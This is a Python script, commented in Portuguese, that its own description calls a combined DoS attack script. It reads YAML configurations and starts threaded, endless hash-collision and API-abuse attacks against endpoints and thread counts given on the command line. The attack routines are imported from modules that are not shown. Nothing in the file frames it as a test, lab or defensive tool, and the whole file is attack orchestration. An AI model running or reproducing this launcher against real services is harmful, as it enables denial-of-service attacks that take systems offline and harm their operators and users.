import threading
import argparse
import yaml
from hash_collision import infinite_hash_collision
from api_abuse import infinite_abuse_api

# Função para carregar a configuração do arquivo YML
def load_config(file_path):
    with open(file_path, 'r') as file:
        return yaml.safe_load(file)

# Função para criar argumentos da linha de comando
def parse_args():
    parser = argparse.ArgumentParser(description="Script Combinado de Ataque DoS")
    parser.add_argument('--endpoint', type=str, help='URL do endpoint da API')
    parser.add_argument('--threads', type=int, help='Número de threads para o ataque')
    parser.add_argument('--hash-endpoint', type=str, help='URL do endpoint para o ataque de colisão de hash')
    parser.add_argument('--hash-threads', type=int, help='Número de threads para o ataque de colisão de hash')
    parser.add_argument('--config-api', type=str, default="config/config_api.yml", help='Caminho para o arquivo de configuração YAML do ataque de API')
    parser.add_argument('--config-hash', type=str, default="config/config_hash.yml", help='Caminho para o arquivo de configuração YAML do ataque de hash')
    parser.add_argument('--run-hash', action='store_true', help='Executar ataque de colisão de hash')
    parser.add_argument('--run-api', action='store_true', help='Executar ataque de abuso de API')
    return parser.parse_args()

# Função principal para rodar o ataque combinado
def run_combined_attack(args):
    if args.run_hash:
        config_hash = load_config(args.config_hash)
        hash_thread = threading.Thread(target=infinite_hash_collision, args=(config_hash, args.hash_endpoint, args.hash_threads))
        hash_thread.start()

    if args.run_api:
        config_api = load_config(args.config_api)
        api_thread = threading.Thread(target=infinite_abuse_api, args=(config_api, args.endpoint, args.threads))
        api_thread.start()

    # Manter o script rodando enquanto os ataques estão em execução
    hash_thread.join() if args.run_hash else None
    api_thread.join() if args.run_api else None

# Execução principal
if __name__ == "__main__":
    args = parse_args()
    run_combined_attack(args)
